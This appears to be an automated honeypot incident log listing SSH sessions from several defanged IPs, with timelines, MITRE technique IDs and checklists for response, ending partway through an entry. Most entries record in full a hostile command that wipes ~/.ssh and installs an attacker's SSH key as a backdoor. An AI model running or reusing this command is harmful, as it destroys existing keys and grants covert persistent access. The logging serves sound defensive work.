### 🔴 HIGH · IR-d834f51ebc03

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:55 |
| **Last Seen** | 2026-04-12 10:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:55:53` | `cowrie.session.connect` |
| `2026-04-12 10:55:53` | `cowrie.client.version` |
| `2026-04-12 10:55:53` | `cowrie.client.kex` |
| `2026-04-12 10:55:54` | `cowrie.login.success` |
| `2026-04-12 10:55:54` | `cowrie.session.params` |
| `2026-04-12 10:55:54` | `cowrie.command.input` |
| `2026-04-12 10:55:54` | `cowrie.command.failed` |
| `2026-04-12 10:55:55` | `cowrie.log.closed` |
| `2026-04-12 10:55:55` | `cowrie.session.params` |
| `2026-04-12 10:55:55` | `cowrie.command.input` |
| `2026-04-12 10:55:55` | `cowrie.session.file_download` |
| `2026-04-12 10:55:55` | `cowrie.log.closed` |
| `2026-04-12 10:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91969a6bf53a

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:55 |
| **Last Seen** | 2026-04-12 10:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:55:58` | `cowrie.session.connect` |
| `2026-04-12 10:55:58` | `cowrie.client.version` |
| `2026-04-12 10:55:59` | `cowrie.client.kex` |
| `2026-04-12 10:56:00` | `cowrie.login.success` |
| `2026-04-12 10:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda751b4e85f

| Field | Detail |
|---|---|
| **Source IP** | `181.23.113[.]121` |
| **First Seen** | 2026-04-12 10:57 |
| **Last Seen** | 2026-04-12 10:57 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:57:26` | `cowrie.session.connect` |
| `2026-04-12 10:57:28` | `cowrie.client.version` |
| `2026-04-12 10:57:28` | `cowrie.client.kex` |
| `2026-04-12 10:57:30` | `cowrie.login.success` |
| `2026-04-12 10:57:33` | `cowrie.session.params` |
| `2026-04-12 10:57:33` | `cowrie.command.input` |
| `2026-04-12 10:57:33` | `cowrie.command.failed` |
| `2026-04-12 10:57:33` | `cowrie.log.closed` |
| `2026-04-12 10:57:34` | `cowrie.session.params` |
| `2026-04-12 10:57:34` | `cowrie.command.input` |
| `2026-04-12 10:57:35` | `cowrie.session.file_download` |
| `2026-04-12 10:57:35` | `cowrie.log.closed` |
| `2026-04-12 10:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.23.113[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.23.113[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31f2e3129e1

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:57 |
| **Last Seen** | 2026-04-12 10:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:57:34` | `cowrie.session.connect` |
| `2026-04-12 10:57:34` | `cowrie.client.version` |
| `2026-04-12 10:57:34` | `cowrie.client.kex` |
| `2026-04-12 10:57:35` | `cowrie.login.success` |
| `2026-04-12 10:57:36` | `cowrie.session.params` |
| `2026-04-12 10:57:36` | `cowrie.command.input` |
| `2026-04-12 10:57:36` | `cowrie.command.failed` |
| `2026-04-12 10:57:36` | `cowrie.log.closed` |
| `2026-04-12 10:57:37` | `cowrie.session.params` |
| `2026-04-12 10:57:37` | `cowrie.command.input` |
| `2026-04-12 10:57:37` | `cowrie.session.file_download` |
| `2026-04-12 10:57:37` | `cowrie.log.closed` |
| `2026-04-12 10:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0d1e5962a1

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:57 |
| **Last Seen** | 2026-04-12 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:57:40` | `cowrie.session.connect` |
| `2026-04-12 10:57:40` | `cowrie.client.version` |
| `2026-04-12 10:57:40` | `cowrie.client.kex` |
| `2026-04-12 10:57:41` | `cowrie.login.success` |
| `2026-04-12 10:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c8c4b1e0e69

| Field | Detail |
|---|---|
| **Source IP** | `181.23.113[.]121` |
| **First Seen** | 2026-04-12 10:57 |
| **Last Seen** | 2026-04-12 10:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:57:41` | `cowrie.session.connect` |
| `2026-04-12 10:57:41` | `cowrie.client.version` |
| `2026-04-12 10:57:42` | `cowrie.client.kex` |
| `2026-04-12 10:57:44` | `cowrie.login.success` |
| `2026-04-12 10:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.23.113[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.23.113[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda1040cc26d

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 11:00 |
| **Last Seen** | 2026-04-12 11:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:00:00` | `cowrie.session.connect` |
| `2026-04-12 11:00:00` | `cowrie.client.version` |
| `2026-04-12 11:00:00` | `cowrie.client.kex` |
| `2026-04-12 11:00:01` | `cowrie.login.success` |
| `2026-04-12 11:00:01` | `cowrie.session.params` |
| `2026-04-12 11:00:01` | `cowrie.command.input` |
| `2026-04-12 11:00:01` | `cowrie.command.failed` |
| `2026-04-12 11:00:01` | `cowrie.log.closed` |
| `2026-04-12 11:00:02` | `cowrie.session.params` |
| `2026-04-12 11:00:02` | `cowrie.command.input` |
| `2026-04-12 11:00:02` | `cowrie.session.file_download` |
| `2026-04-12 11:00:02` | `cowrie.log.closed` |
| `2026-04-12 11:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1668142186bd

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 11:00 |
| **Last Seen** | 2026-04-12 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:00:03` | `cowrie.session.connect` |
| `2026-04-12 11:00:03` | `cowrie.client.version` |
| `2026-04-12 11:00:04` | `cowrie.client.kex` |
| `2026-04-12 11:00:04` | `cowrie.login.success` |
| `2026-04-12 11:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bf8652a650

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 11:00 |
| **Last Seen** | 2026-04-12 11:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:00:41` | `cowrie.session.connect` |
| `2026-04-12 11:00:41` | `cowrie.client.version` |
| `2026-04-12 11:00:41` | `cowrie.client.kex` |
| `2026-04-12 11:00:42` | `cowrie.login.success` |
| `2026-04-12 11:00:43` | `cowrie.session.params` |
| `2026-04-12 11:00:43` | `cowrie.command.input` |
| `2026-04-12 11:00:43` | `cowrie.command.failed` |
| `2026-04-12 11:00:43` | `cowrie.log.closed` |
| `2026-04-12 11:00:43` | `cowrie.session.params` |
| `2026-04-12 11:00:43` | `cowrie.command.input` |
| `2026-04-12 11:00:44` | `cowrie.session.file_download` |
| `2026-04-12 11:00:44` | `cowrie.log.closed` |
| `2026-04-12 11:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2abb886f8fdb

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 11:00 |
| **Last Seen** | 2026-04-12 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:00:47` | `cowrie.session.connect` |
| `2026-04-12 11:00:47` | `cowrie.client.version` |
| `2026-04-12 11:00:47` | `cowrie.client.kex` |
| `2026-04-12 11:00:48` | `cowrie.login.success` |
| `2026-04-12 11:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d9ed94e2bd

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 11:01 |
| **Last Seen** | 2026-04-12 11:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:01:39` | `cowrie.session.connect` |
| `2026-04-12 11:01:39` | `cowrie.client.version` |
| `2026-04-12 11:01:39` | `cowrie.client.kex` |
| `2026-04-12 11:01:40` | `cowrie.login.success` |
| `2026-04-12 11:01:40` | `cowrie.session.params` |
| `2026-04-12 11:01:40` | `cowrie.command.input` |
| `2026-04-12 11:01:40` | `cowrie.command.failed` |
| `2026-04-12 11:01:40` | `cowrie.log.closed` |
| `2026-04-12 11:01:40` | `cowrie.session.params` |
| `2026-04-12 11:01:40` | `cowrie.command.input` |
| `2026-04-12 11:01:40` | `cowrie.session.file_download` |
| `2026-04-12 11:01:40` | `cowrie.log.closed` |
| `2026-04-12 11:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4923a22e9d3

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 11:01 |
| **Last Seen** | 2026-04-12 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:01:42` | `cowrie.session.connect` |
| `2026-04-12 11:01:42` | `cowrie.client.version` |
| `2026-04-12 11:01:42` | `cowrie.client.kex` |
| `2026-04-12 11:01:42` | `cowrie.login.success` |
| `2026-04-12 11:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38c3e7a67d2

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 11:01 |
| **Last Seen** | 2026-04-12 11:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:01:47` | `cowrie.session.connect` |
| `2026-04-12 11:01:47` | `cowrie.client.version` |
| `2026-04-12 11:01:47` | `cowrie.client.kex` |
| `2026-04-12 11:01:47` | `cowrie.login.success` |
| `2026-04-12 11:01:47` | `cowrie.session.params` |
| `2026-04-12 11:01:47` | `cowrie.command.input` |
| `2026-04-12 11:01:47` | `cowrie.command.failed` |
| `2026-04-12 11:01:48` | `cowrie.log.closed` |
| `2026-04-12 11:01:48` | `cowrie.session.params` |
| `2026-04-12 11:01:48` | `cowrie.command.input` |
| `2026-04-12 11:01:48` | `cowrie.session.file_download` |
| `2026-04-12 11:01:48` | `cowrie.log.closed` |
| `2026-04-12 11:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e93900a7de

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 11:01 |
| **Last Seen** | 2026-04-12 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:01:50` | `cowrie.session.connect` |
| `2026-04-12 11:01:50` | `cowrie.client.version` |
| `2026-04-12 11:01:50` | `cowrie.client.kex` |
| `2026-04-12 11:01:50` | `cowrie.login.success` |
| `2026-04-12 11:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-971d639fcc99

| Field | Detail |
|---|---|
| **Source IP** | `181.23.113[.]121` |
| **First Seen** | 2026-04-12 11:02 |
| **Last Seen** | 2026-04-12 11:02 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:02:27` | `cowrie.session.connect` |
| `2026-04-12 11:02:27` | `cowrie.client.version` |
| `2026-04-12 11:02:27` | `cowrie.client.kex` |
| `2026-04-12 11:02:29` | `cowrie.login.success` |
| `2026-04-12 11:02:30` | `cowrie.session.params` |
| `2026-04-12 11:02:30` | `cowrie.command.input` |
| `2026-04-12 11:02:30` | `cowrie.command.failed` |
| `2026-04-12 11:02:30` | `cowrie.log.closed` |
| `2026-04-12 11:02:32` | `cowrie.session.params` |
| `2026-04-12 11:02:32` | `cowrie.command.input` |
| `2026-04-12 11:02:34` | `cowrie.session.file_download` |
| `2026-04-12 11:02:34` | `cowrie.log.closed` |
| `2026-04-12 11:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.23.113[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.23.113[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78dad58cbbba

| Field | Detail |
|---|---|
| **Source IP** | `181.23.113[.]121` |
| **First Seen** | 2026-04-12 11:02 |
| **Last Seen** | 2026-04-12 11:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 11:02:45` | `cowrie.session.connect` |
| `2026-04-12 11:02:45` | `cowrie.client.version` |
| `2026-04-12 11:02:46` | `cowrie.client.kex` |
| `2026-04-12 11:02:48` | `cowrie.login.success` |
| `2026-04-12 11:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.23.113[.]121` to AbuseIPDB if not already reported
- [ ] Block `181.23.113[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f7fcf33e0b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 11:03 |
| **Last Seen** | 2026-04-12 11:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
